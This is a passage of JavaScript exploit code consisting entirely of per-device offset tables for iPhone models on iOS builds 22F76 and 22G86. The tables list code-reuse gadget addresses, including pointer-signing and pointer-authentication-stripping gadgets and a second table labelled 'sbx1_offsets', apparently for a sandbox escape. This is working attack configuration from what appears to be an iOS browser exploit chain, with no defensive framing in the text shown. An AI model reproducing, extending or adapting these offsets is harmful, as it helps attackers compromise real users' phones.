      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone16,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2629b198cn,
      fcall_14_args_write_x8: 0x24d60b054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x26229a98cn,
      fcall_14_args_write_x8: 0x24cefc054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x26229a98cn,
      fcall_14_args_write_x8: 0x24cefc054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f11c2ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261ef698cn,
      fcall_14_args_write_x8: 0x24cef8054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb502cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f11c2ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261ef698cn,
      fcall_14_args_write_x8: 0x24cef8054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb502cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1142ecn,
      tcall_X0LG: 0x21f281150n,
      tcall_RLG: 0x20dfce178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261c6098cn,
      fcall_14_args_write_x8: 0x24cef0054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23adad02cn,
      transformSurface_gadget: 0x2103ecb70n,
      xpac_gadget: 0x1b683ca08n
   }
};

    sbx1_offsets = {
   "iPhone11,2_4_6_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23abc402cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c605ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d4a98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef3e2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd46178n,
      tcall_X0LG: 0x21effe150n,
      transformSurface_gadget: 0x210164b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone11,8_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9002cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c5d1ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d3d98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef0a2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f002150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,1_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9002cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c615ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e2798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef0a2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f002150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,3_5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9002cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c615ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e2798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef0a2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f002150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,8_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23aab602cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c531ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d7398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ee2c2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f00a150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,1_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7f4ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2610ce98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed492ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f019150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,2_3_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7f8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26146998cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7f8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26146998cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,2_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c838ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26182798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed192ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,3_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c838ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26182798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed192ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a99f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c834ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26149198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed152ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f019150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a99f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c834ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26149198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed152ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f019150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,6_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a91b02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7acea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26144098cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ec912ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,7_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9b302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26184d98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed292ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02d150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,8_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9b302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26184d98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed292ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02d150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,2_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c891ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c4398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6a178n,
      tcall_X0LG: 0x21f035150n,
      transformSurface_gadget: 0x210188b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,3_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c891ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c4398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6a178n,
      tcall_X0LG: 0x21f035150n,
      transformSurface_gadget: 0x210188b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c88dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618e798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c88dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618e798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone16,1_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d041ea8n,
